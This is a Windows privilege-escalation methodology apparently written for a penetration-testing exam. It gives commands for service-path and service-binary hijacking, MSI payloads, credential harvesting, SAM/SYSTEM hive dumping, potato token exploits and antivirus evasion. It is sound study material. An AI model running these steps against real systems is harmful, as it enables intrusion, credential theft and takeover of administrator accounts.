> Purpose: take a Windows shell to SYSTEM/Administrator by checking services, token privileges, install policies and stored credentials — in that order, with automated scanners only after the manual pass. ## Why manual first winPEAS and PrivescCheck produce hundreds of lines of "possible" findings. The exam scores a decision, not a scan. Manual checks (15-20 minutes) find the intended path; the scanners catch what you missed. Order: identity → services → tasks → install policy → credentials → tokens → registry → scanner → kernel. ## A. Identity and privileges ### Step 01 — Who am I, and what can I do? Priority: Core · Run on: target · Status: Syntax Checked ```shen whoami whoami /priv whoami /groups whoami /all ``` Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, and membership of Administrators, Backup Operators.
Decision: SeImpersonate enabled → Section F (potato). SeBackup → dump SAM/SYSTEM. Admin group but unelevated (UAC) → try runas/UAC bypass only if the token allows.
Next: Step 02.
Common mistake: stopping at whoami. The privileges list is the single highest-value output on Windows.
Evidence: the whoami /priv block. ### Step 02 — System and patch level Priority: Core · Run on: target · Status: Syntax Checked ```shen systeminfo wmic qfe get Caption,HotFixID,InstalledOn ``` Look for: OS build, architecture, hotfix list, install date.
Decision: an old build missing a specific patch → Section I. A modern build → configuration/credential paths, not kernel exploits.
Next: Step 03.
Common mistake: using systeminfo alone to claim "unpatched". Compare the build number with the advisory's fixed build.
Evidence: OS name, build, and the hotfix list. ### Step 03 — Local users and administrators Priority: Core · Run on: target · Status: Syntax Checked ```shen net user net localgroup administrators net localgroup "Remote Desktop Users" ``` Look for: non-standard accounts, a service account in Administrators, guest enabled.
Decision: a service account with a weak password → credential path. No second admin account → focus on privilege escalation, not lateral movement.
Next: Section B.
Common mistake: assuming an account called svc_backup is unprivileged. Check its groups.
Evidence: the group listing. ## B. Services ### Step 04 — Enumerate services and their binaries Priority: Core · Run on: target · Status: Syntax Checked ```shen wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\" sc query state= all ``` Look for: auto-start services whose binary path is unquoted and contains spaces, or lives in a user-writable directory.
Decision: unquoted path with spaces → Step 05. Writable binary/directory → Step 06.
Next: Step 05.
Common mistake: only looking at running services. Stopped auto-start services are equally exploitable and less noticed.
Evidence: the service name and its exact PathName. ### Step 05 — Unquoted service path Priority: Core · Run on: target · Status: Documented ```shen sc qc icacls "C:\Program Files\Vulnerable App" ``` Look for: BINARY_PATH_NAME : C:\Program Files\Vulnerable App\service.exe — no quotes, spaces in the path.
Decision: you can write to C:\Program.exe or C:\Program Files\Vulnerable.exe → drop a payload there, then restart the service. No write access → dead end.
Next: Step 07 (payload) then sc stop/start.
Common mistake: testing writability by trying to create the file. Use icacls first, and clean up anything you create.
Evidence: the service config plus the writable directory. ### Step 06 — Replace a service binary Priority: Conditional · Run on: target · Status: Documented ```shen icacls "C:\Path\To\service.exe" sc config binpath= "C:\temp\shell.exe" sc stop sc start ``` Look for: (F) or (M) for your user on the binary or its directory, or SERVICE_CHANGE_CONFIG rights.
Decision: can change the path → point it at your payload. Can only overwrite the file → back it up first.
Next: the service starts as SYSTEM and runs your payload.
Common mistake: not restoring the original binary. A broken service can break the box for later steps.
Evidence: before/after sc qc, and the shell. ### Step 07 — Service permissions audit Priority: Conditional · Run on: target · Status: Documented ```shen accesschk.exe /accepteula -uwcqv "Authenticated Users" * accesschk.exe /accepteula -uwcqv "Users" * ``` Look for: SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG, SERVICE_START on a service running as SYSTEM.
Decision: CHANGE_CONFIG → Step 06. SERVICE_STOP/START only → hijack the binary path indirectly.
Next: Step 06.
Common mistake: running accesschk without /accepteula in a non-interactive shell — it hangs on the EULA prompt.
Evidence: the permission line for the service. ## C. Scheduled tasks ### Step 08 — Enumerate tasks and their files Priority: Core · Run on: target · Status: Syntax Checked ```shen schtasks /query /fo LIST /v schtasks /query /fo LIST /v | findstr /i "TaskName Run As" ``` Look for: tasks running as SYSTEM/Administrator that execute a script in a writable location.
Decision: writable script → replace it (back it up). Task file writable but not the action → check the task's XML permissions.
Next: wait for the trigger, or schtasks /run /tn "".
Common mistake: assuming all tasks run as SYSTEM. Read the "Run As User" line.
Evidence: the task name, action path, and run-as user. ## D. Install policy ### Step 09 — AlwaysInstallElevated Priority: Core · Run on: target · Status: Syntax Checked ```shen reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated ``` Look for: both values 0x1.
Decision: both set → Step 10. Only one set → not exploitable; move on.
Next: Step 10.
Common mistake: seeing 0x1 in one hive and declaring victory. The policy requires both HKLM and HKCU.
Evidence: both registry outputs. ### Step 10 — MSI payload Priority: Conditional · Run on: target · Status: Documented ```shen msiexec /quiet /qn /i C:\temp\shell.msi ``` Look for: a SYSTEM shell on your listener.
Decision: no callback → check the MSI architecture (x86 vs x64) and your listener.
Next: proof.
Common mistake: building the MSI on the target with a tool that is not present. Generate it on Kali and transfer it.
Evidence: the registry state, the MSI command, and the resulting shell. ## E. Credentials on the box ### Step 11 — Stored credentials and common files Priority: Core · Run on: target · Status: Syntax Checked ```shen cmdkey /list dir C:\Users\*\AppData\Roaming\Microsoft\Credentials 2>nul type C:\Windows\Panther\unattend.xml 2>nul type C:\Windows\System32\sysprep\sysprep.inf 2>nul reg query HKLM\SOFTWARE\ /s /f password 2>nul ``` Look for: saved RDP/domain credentials in cmdkey, base64 passwords in unattend.xml, plaintext service passwords in the registry.
Decision: a credential is found → runas /savecred or PsExec with it. No credential → Section F.
Next: validate the credential.
Common mistake: reading unattend.xml and skipping the base64 decode. echo | base64 -d (or PowerShell) reveals the password.
Evidence: the file path and the recovered credential. ### Step 12 — SAM and SYSTEM (backup privilege) Priority: Conditional · Run on: target · Status: Documented ```shen reg save HKLM\SAM C:\temp\sam.hive reg save HKLM\SYSTEM C:\temp\system.hive ``` Look for: two hive files you can download (via SMB, certutil, or a base64 transfer).
Decision: files obtained → dump hashes offline with impacket-secretsdump -sam sam.hive -system system.hive LOCAL.
Next: pass-the-hash.
Common mistake: trying reg save without SeBackupPrivilege — it fails silently for a normal admin in some configurations.
Evidence: the hive files and the recovered hashes. ## F. Token impersonation ### Step 13 — Confirm the privilege Priority: Core · Run on: target · Status: Syntax Checked ```shen whoami /priv | findstr /i "Impersonate AssignPrimaryToken" ``` Look for: SeImpersonatePrivilege Enabled.
Decision: enabled → Step 14. Present but disabled → try to enable it, or find a service that impersonates for you.
Next: Step 14.
Common mistake: confusing Enabled with Disabled in the output. The state column matters.
Evidence: the privilege line. ### Step 14 — Potato-family exploit Priority: Core · Run on: target · Status: Documented ```shen PrintSpoofer.exe -i -c "cmd /c whoami" GodPotato.exe -cmd "cmd /c whoami" ``` Look for: nt authority\system.
Decision: the exploit fails → the OS build may have patched that specific technique (PrintSpoofer for older builds, GodPotato/RoguePotato for newer). Try the variant that matches the build.
Next: get a SYSTEM shell.
Common mistake: running a potato exploit on a build that patched it and concluding "SeImpersonate is useless". Try a different family member.
Evidence: whoami returning SYSTEM. ## G. Registry and permissions ### Step 15 — Registry key permissions Priority: Conditional · Run on: target · Status: Documented ```powershell Get-Acl HKLM:\SOFTWARE\ | Format-List Get-Acl HKLM:\SYSTEM\CurrentControlSet\Services\ | Format-List ``` Look for: FullControl or SetValue granted to Users/Authenticated Users on a key that a privileged process reads.
Decision: writable key used by a service → change its ImagePath or configuration to point at your payload.
Next: restart the service.
Common mistake: picking a key nobody reads. Find the key that the vulnerable service actually consumes.
Evidence: the ACL and the value you changed. ## H. Network and listening services ### Step 16 — Local-only services Priority: Core · Run on: target · Status: Syntax Checked ```shen netstat -ano tasklist /svc ``` Look for: listeners on 127.0.0.1 with a PID, especially on high ports.
Decision: an admin service bound to [localhost](http://localhost) → tunnel to it (portproxy or SSH) and attack it as root.
Next: pivot to the service.
Common mistake: ignoring [localhost](http://localhost) listeners because "there is nothing remote". They are often the intended privesc path.
Evidence: the netstat line with PID and the matching process. ## I. Automated enumeration ### Step 17 — winPEAS Priority: Conditional · Run on: target · Status: Syntax Checked ```shen .\winPEASx64.exe ``` Look for: red "known vulnerability" blocks, service misconfigurations, credentials, AlwaysInstallElevated.
Decision: each red block still needs manual confirmation (Sections B-G).
Next: verify the top finding by hand.
Common mistake: pasting winPEAS output as a finding. The report needs the exploit you ran and its output.
Evidence: the scan output as an appendix. ### Step 18 — PrivescCheck Priority: Conditional · Run on: target · Status: Documented ```powershell powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended" ``` Look for: a structured list of findings with severity, plus registry and policy checks winPEAS sometimes buries.
Decision: cross-reference with the manual pass; PrivescCheck is quieter and more readable in a report.
Next: exploit the confirmed finding.
Common mistake: running it without -Extended and missing policy checks.
Evidence: the exported report. ## J. Kernel exploits ### Step 19 — Match build to advisory Priority: Advanced · Run on: target · Status: Documented ```shen systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" ``` Look for: a build number matching a local privilege-escalation CVE.
Decision: a match exists → read the exploit, confirm the architecture, and accept the crash risk. On the exam, prefer a configuration flaw.
Next: run only if a revert is acceptable.
Common mistake: running MS16-032/MS17-010-style exploits on a patched build and hanging the box.
Evidence: build number, exploit name, and the reason it applies. ## K. Decision tree: manual to automated | What you found | Do this | Do not | | --- | --- | --- | | SeImpersonate enabled | Potato family (Step 14) | Ignore it and run winPEAS | | Unquoted service path + writable dir | Plant binary, restart service (Step 05) | Overwrite the existing binary | | Service with weak config rights | sc config to your payload (Step 06) | Restart blindly without a backup | | Writable scheduled-task script | Replace payload (Step 08) | Wait a day for the trigger — run the task | | AlwaysInstallElevated = 1/1 | MSI payload (Step 10) | Assume one hive is enough | | Saved credentials in cmdkey | runas /savecred (Step 11) | Crack what is already usable | | SeBackupPrivilege | Dump SAM/SYSTEM (Step 12) | Try to read the hives directly | | Writable registry key | Repoint the service (Step 15) | Guess which key is used | | [Localhost](http://Localhost)-only service | Tunnel and attack it (Step 16) | Declare "no privesc" | | Nothing after 20-30 min | winPEAS (Step 17) | Repeat the same checks | | winPEAS noisy | PrivescCheck (Step 18) | Run kernel exploits blindly | | Build matches a CVE | Decide, then run (Step 19) | Crash the box on a hunch | Hard rule: if you are 45 minutes in with no vector, revert and re-read your own enumeration. A fresh pass beats a fourth scanner. ## L. Troubleshooting | Symptom | Cause | Fix | | --- | --- | --- | | accesschk hangs | EULA prompt | Add /accepteula | | sc syntax error | Missing space after = | binpath= "C:\path" — the space is required | | Potato exploit returns nothing | Technique patched on this build | Try another family member or another path | | MSI installs but no callback | Architecture mismatch / listener | Rebuild for the target arch; check LPORT | | reg save access denied | No SeBackupPrivilege | Use another credential path | | Payload deleted by AV | Defender active | Try an obfuscated/encoded payload, or a different vector | | Shell dies instantly | Payload exits | Use a staged/looping payload; catch again | | RDP/PsExec fails but SMB works | Firewall on 3389/445 | Use WinRM (5985) or SMB-based exec | Pivoting variant. If the Windows host can only reach an internal pivot, a reverse shell to Kali will not connect. Forward a port from the pivot (ssh -L) and catch the shell there, or use a bind shell reached through proxychains4. Impacket through a pivot: proxychains4 impacket-wmiexec /:@. ## M. Quick workflow 1. whoami /priv + whoami /groups. 2. systeminfo + wmic qfe. 3. Services: unquoted paths, writable binaries, accesschk. 4. Scheduled tasks and their scripts. 5. AlwaysInstallElevated both hives. 6. cmdkey /list, unattend/sysprep, registry passwords. 7. SeImpersonate → potato. 8. Registry ACLs, [localhost](http://localhost) services. 9. winPEAS → PrivescCheck. 10. Kernel exploit last. ## N. Evidence to preserve - whoami /priv (the privilege that justified the path). - sc qc output or the ACL that showed the misconfiguration. - The exact command that produced SYSTEM, and whoami afterwards. - type C:\Users\Administrator\Desktop\proof.txt plus ipconfig in one screenshot. - Any service you modified — note whether you restored it. ## O.
